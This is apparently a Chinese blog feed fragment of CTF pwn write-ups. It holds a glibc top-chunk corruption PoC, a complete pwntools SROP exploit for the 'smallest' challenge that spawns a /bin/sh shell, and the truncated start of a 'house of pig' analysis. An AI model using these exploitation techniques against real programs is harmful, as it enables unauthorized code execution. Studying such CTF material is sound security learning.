class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>可以看到存在两个assert，第一个assert我们很好绕过，只需要保留top chunk的后三位即可保留，第二个则是我们申请的size大于top chunk的size。</p><p>因为没找到poc我就自己写了一个，其实也是很简单的，很好就可以想到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">intptr_t</span> *fp;</span><br><span class="line">    fp = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *top;</span><br><span class="line">    top = fp + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;the top chunk starts at %p;\n&quot;</span>, top);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;the size of top chunk is %#lx;\n&quot;</span>, *(top + <span class="number">1</span>));</span><br><span class="line">    *(top + <span class="number">1</span>) = <span class="number">0xd91</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now,the top chunk is inserted the unsorted bin\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://github.com/shellphish/how2heap" >https://github.com/shellphish/how2heap<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.anquanke.com/post/id/218887" >https://www.anquanke.com/post/id/218887<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;没错！标题的星号就是脏字！&lt;/p&gt;
&lt;h2 id=&quot;house-of-force&quot;&gt;&lt;a href=&quot;#house-of-force&quot; class=&quot;headerlink&quot; title=&quot;house of force&quot;&gt;&lt;/a&gt;house of force&lt;/h2&gt;&lt;p&gt;这</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
    <category term="house of force" scheme="https://cv196082.gitee.io/tags/house-of-force/"/>
    
    <category term="house of lora" scheme="https://cv196082.gitee.io/tags/house-of-lora/"/>
    
    <category term="house of botcake" scheme="https://cv196082.gitee.io/tags/house-of-botcake/"/>
    
    <category term="house of orange" scheme="https://cv196082.gitee.io/tags/house-of-orange/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://cv196082.gitee.io/2022/03/01/SROP/"/>
    <id>https://cv196082.gitee.io/2022/03/01/SROP/</id>
    <published>2022-03-01T08:03:27.000Z</published>
    <updated>2022-03-01T08:20:03.126Z</updated>
    
    <content type="html"><![CDATA[<p>在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐<a class="link"   href="https://www.anquanke.com/post/id/217081" >这个博主<i class="fas fa-external-link-alt"></i></a>，我这里就不在赘述了。</p><p>题目:2016年-360春秋杯-srop赛题smallest        buu上面也有</p><p>题目就是裸奔，除了堆栈不可执行都没开</p><p>题目的代码也很简单，就在start存在</p><p><img src="/images/image-20220301160806071.png" alt="image-20220301160806071"></p><p>我对于这个东西的理解：在调用sys_rt_sigreturn时，会将rsp所指向的位置当作sigFrame，以至于我们可以随便伪造sigFrame</p><p>在实行SROP攻击的时候需要知道的几个条件：需要泄漏出一个栈地址，需要知道syscall的地址，需要控制rax</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.send(p64(start_addr)*<span class="number">3</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">stack_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>首先泄漏栈地址，从上图可以看到start_addr=0x4000b0，我们首先写入三个start的地址到栈里面，然后进行下一个read，我们输入b’\xb3’，那么这时候我们将我们写入的第二个start地址改成了0x4000b3，并且此时的rax为1，所以下一次就会输出0x400个栈上面的内容，借机泄漏栈地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>在第三个read的时候我们写入start的地址和伪造的sigframe，接着进入第四次read，随后写入syscall地址，然后补齐0xf个字节，然后就会执行sys_rt_sigreturn，并且此时的rsp正好指向了我们伪造的sigframe。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bin_sh_addr = stack_addr+<span class="number">0x120</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br></pre></td></tr></table></figure><p>此时，在执行完之后就会进入第五次read，此次read是我们构造的，所以rsi在我们已知的栈地址上面写入内容，所以使用同样的方法构造出execve。</p><h3 id="综上得出exp"><a href="#综上得出exp" class="headerlink" title="综上得出exp"></a>综上得出exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./smallest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line"></span><br><span class="line">r.send(p64(start_addr)*<span class="number">3</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x8</span>)</span><br><span class="line">stack_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr+<span class="number">0x120</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh_addr</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">0xf</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐&lt;a class=&quot;link&quot;   href=&quot;https://www.anquanke.com/post/id/217081&quot; &gt;这个博主&lt;i class=&quot;fas fa-ext</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="SROP" scheme="https://cv196082.gitee.io/tags/SROP/"/>
    
  </entry>
  
  <entry>
    <title>house of pig</title>
    <link href="https://cv196082.gitee.io/2022/03/01/house-of-pig/"/>
    <id>https://cv196082.gitee.io/2022/03/01/house-of-pig/</id>
    <published>2022-03-01T02:14:26.000Z</published>
    <updated>2022-03-07T04:53:54.789Z</updated>
    
    <content type="html"><![CDATA[<p>在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。</p><h2 id="ida恢复跳表"><a href="#ida恢复跳表" class="headerlink" title="ida恢复跳表"></a>ida恢复跳表</h2><p>首先看到main函数存在这样一句</p><p><img src="/images/image-20220301101946273.png" alt="image-20220301101946273"></p><p>看不懂就直接看汇编。</p><p><img src="/images/image-20220301102019688.png" alt="image-20220301102019688"></p><p>可以看出来其实这里是一个类似与switch的语句。只不过ida没有翻译过来。</p><p>恢复的办法就是在IDA的edit当中的other里用Specify switch idiom</p><p><img src="/images/image-20220301102326958.png" alt="image-20220301102326958"></p><blockquote><ul><li>Address of Jump table：设置成 jump table 的地址</li><li>Number of elements：设置为 jump table 中存在的元素总数</li><li>Size of table element：设置为 jump table 中元素的类型</li><li>Element shift amount：这个一般情况下都是零，和跳表计算时的方式有关，比如此题只是单纯的跳表地址加跳表中的元素，那么就不需要移位</li><li>Element base value：设置为计算跳转地址时给跳表元素加的值，比如此题的计算方法为 <code>&amp;unk_69E0 + unk_69E0[i]</code>，那么这里就应该填跳表的地址</li><li>Start of the switch idiom：这个默认就行，就是获取跳表值的语句的地址</li><li>Input register of switch：设置为用于给跳表寻址的寄存器</li><li>First(lowest) input value：就是 switch 的最小值了</li><li>Default jump address：也就是 default 的跳转位置，其实有时候可以不填，但是最好还是填上，这个一般在上方不远处的 cmp 指令附近，特征就是判断了输入，然后跳转到某个地址上，跳转的这个地址就是要填的值了</li></ul></blockquote><p>以上是各参数的意义</p><p><img src="/images/image-20220301102916881.png" alt="image-20220301102916881"></p><p>最终填写的结果是这样。</p><p><img src="/images/image-20220301102933410.png" alt="image-20220301102933410"></p><p>最终呈现的结果是这样。</p><h2 id="在Glibc2-31下的FSOP"><a href="#在Glibc2-31下的FSOP" class="headerlink" title="在Glibc2.31下的FSOP"></a>在Glibc2.31下的FSOP</h2><p>在以前纯粹讲解FSOP的时候发现的问题是，在2.29时的_IO_str_overflow函数就没有了用变量当作函数来调用，但是源码中还存在这样一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *new_buf;</span><br><span class="line"><span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当中调用了malloc然后memcpy到堆上，最后free掉，这样对于只存在calloc的程序可以说是毁灭性的打击。具体在题目中演示</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>题目依旧是菜单题，不同的是，题目是存在三个角色，每个角色在创建堆块和修改堆块时都是不一样的。</p><p>在这里先把角色的结构体给大家：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pig</span>&#123;</span></span><br><span class="line">    chunk_arr[<span class="number">24</span>];</span><br><span class="line">    chunk_size[<span class="number">24</span>];</span><br><span class="line">    chunk_exist[<span class="number">24</span>];</span><br><span class="line">    chunk_freed[<span class="number">24</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是第一个角色Peppa的create</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">create_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; *(a1 + <span class="number">8LL</span> * i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(users + <span class="number">84</span>) &lt;= <span class="number">143</span> )</span><br><span class="line">      *(users + <span class="number">84</span>) = <span class="number">144</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    v8 = input_int();</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= *(users + <span class="number">84</span>) &amp;&amp; v8 &lt;= <span class="number">0x430</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(users + <span class="number">0x54</span>) = v8;</span><br><span class="line">      *(a1 + <span class="number">8LL</span> * i) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v8);</span><br><span class="line">      <span class="keyword">if</span> ( !*(a1 + <span class="number">8LL</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(a1 + <span class="number">4</span> * (i + <span class="number">0x30</span>LL)) = v8;</span><br><span class="line">      *(a1 + i + <span class="number">0x120</span>) = <span class="number">0</span>;</span><br><span class="line">      *(a1 + i + <span class="number">0x138</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8 / <span class="number">48</span>; ++j )</span><br><span class="line">        sub_2DBC((*(a1 + <span class="number">8LL</span> * i) + <span class="number">48</span> * j), <span class="number">16LL</span>);</span><br><span class="line">      v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面是让下一次创建的堆块必须大于或则等于上一次创建的，以及在后面的for循环里写入内容中间都会出现两行空白<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);</code>。在第二个角色也就是Mummy，创建堆块的规则是一样的，不过写入内容是<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j + 16LL), 16LL);</code></p><p>但是第三个角色有所区别：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">create_3</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// 